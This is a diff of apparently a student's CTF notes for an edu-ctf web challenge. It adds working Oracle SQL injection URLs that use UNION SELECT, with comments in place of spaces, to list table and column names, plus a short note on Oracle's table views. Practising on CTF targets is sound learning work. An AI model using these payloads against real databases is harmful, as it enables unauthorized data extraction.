@@ -27,7 +27,13 @@
 
 ## Work part
 
-`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/user_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=6` --> WORK!!!! S3CRET!
+
+```
+USER_TABLES is tables which you own
+ALL_TABLES is tables which own, and tables owner by other users, which you have been granted excplicit access to
+DBA_TABLES is all tables in the database
+```
+`https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,table_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,table_name/**/FROM/**/all_tables/**/ORDER/**/BY/**/table_name)/**/where/**/r=6` --> WORK!!!! S3CRET!
 
 `https://edu-ctf.csie.org:10159/video.php?vid=-1/**/union/**/select/**/1,column_name,null/**/from/**/(SELECT/**/ROWNUM/**/r,column_name/**/FROM/**/user_tab_columns/**/ORDER/**/BY/**/column_name)/**/where/**/r=19` --> WORK!!!! V3RY_S3CRET_C0LUMN!
 
